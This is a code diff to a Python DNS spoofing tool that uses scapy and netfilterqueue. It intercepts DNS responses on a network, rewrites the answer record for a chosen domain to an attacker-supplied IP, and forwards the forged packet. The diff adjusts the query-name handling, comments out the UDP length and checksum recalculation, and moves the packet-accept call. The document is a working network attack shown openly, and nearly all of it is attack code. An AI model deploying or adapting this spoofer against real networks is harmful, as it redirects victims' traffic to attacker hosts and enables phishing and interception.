@@ -17,7 +17,8 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
 
     if scapy_packet.haslayer(scapy.DNSRR):
-        qname = str(scapy_packet[scapy.DNSQR].qname).strip('.')
+        qname = str(scapy_packet[scapy.DNSQR].qname)
+
         if options.web_name in qname:
             print("[+] Spoofing the target for:", qname)
             answer = scapy.DNSRR(rrname=qname, rdata=options.spoof_ip)  # Spoofed IP
@@ -26,11 +27,11 @@ def process_packet(packet):
 
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].len
-            del scapy_packet[scapy.UDP].chksum
-            print(scapy_packet.show())
+        #     #del scapy_packet[scapy.UDP].len
+        #     #del scapy_packet[scapy.UDP].chksum
+        #     print(scapy_packet.show())
             packet.set_payload(bytes(scapy_packet))  # Set the modified packet payload
-        packet.accept()  # Accept the packet
+    packet.accept()  # Accept the packet
 options = get_argument()
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
